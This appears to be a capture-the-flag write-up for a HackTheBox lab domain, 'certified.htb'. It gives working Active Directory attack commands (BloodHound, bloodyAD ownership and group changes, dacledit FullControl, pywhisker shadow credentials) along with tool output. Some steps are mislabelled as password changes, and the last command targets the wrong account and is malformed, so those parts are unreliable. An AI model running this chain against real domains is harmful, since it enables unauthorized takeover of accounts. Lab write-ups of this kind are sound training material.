
initaial access with given user: 

```
judith.mader:judith09
```

## Run Bloodhound

```
bloodhound.py -u 'judith.mader' -p 'judith09' -d 'certified.htb' -dc dc01.certified.htb -ns 10.129.73.100 -c all
```

Import data to bloodhound

Judith has writeonwer rights on group "Management"
there for we can add judith as the owner of this group. 

this can be done with bloodyAD

```
bloodyAD --host 10.129.73.100 -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
```

now we are owner of the group. we can add judith into to groub give her full control rights and then change the password for "management_svc"

```
KRB5CCNAME=judith.mader.ccache dacledit.py -k -no-pass -dc-ip 10.129.73.100 -principal judith.mader -target Management -action write -rights FullControl certified.htb/judith.mader
```

### add judith to Managment group

```
bloodyAD --host 10.129.73.100 -d "certified.htb" -u "judith.mader" -p "judith09" add groupMember Management judith.mader
```

with the following command we can change the password for management_svc

this is done via pywhisker

```
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" -t "management_svc" -a "add"
```

now we have changed the password for management_svc

```
❯ pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" -t "management_svc" -a "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b2011c96-19a7-3ad3-f5ce-062635b7e708
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: y8DqIstn.pfx
[*] Must be used with password: JHMLsBj7SBhwkWOKu5QV
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITto
```

### change password for CA_OPERATOR

Management_svc user has GenericAll rights on CA_Operator. Therefore we can now change this password aswell. 

```
pywhisker -d "certified.htb" -u "management_svc" -p "JHMLsBj7SBhwkWOKu5QV" -t "management_svc" -a "add
```